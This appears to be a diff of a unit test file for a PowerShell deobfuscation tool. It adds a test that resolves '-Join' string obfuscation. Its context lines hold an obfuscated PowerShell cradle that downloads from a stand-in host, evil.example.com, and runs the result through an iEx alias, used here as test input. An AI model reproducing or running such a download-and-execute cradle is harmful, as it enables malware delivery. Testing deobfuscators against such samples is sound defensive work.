@@ -45,6 +45,23 @@ class TestPowerShellASTDeobfuscator(TestUnitBase):
         ]:
             self.assertIn(c2server, result)
 
+    def test_join_operator(self):
+        data = (
+            b"$ms = -Join ('Me', 'morySt', 'ream')\n"
+            b"$rf = -Join ('Rfc2', '898', 'Derive', 'Bytes')\n"
+            b"$xx = @($ms, 'rypto', $rf, 'esManag', 'rea')\n"
+            b"$ua = ('Mozilla/5.0', '(Windows NT 10.0; Win64; x64)', 'AppleWebKit/537.36', '(KHTML,like Gecko)') -Join ' '\n"
+            b"Write-Output $xx $ua\n"
+            b"Write-Output $xx $ua\n"
+        )
+        result = data | self.load() | str
+        self.assertNotIn('$ms', result)
+        self.assertNotIn('$rf', result)
+        self.assertIn('MemoryStream', result)
+        self.assertIn('Rfc2898DeriveBytes', result)
+        self.assertIn(
+            "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko)'", result)
+
     def test_real_world_03(self):
         data = BR'''$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e').Replace('s2Wr6qQR', 'wnloadS'))))'''
         deob = self.load()
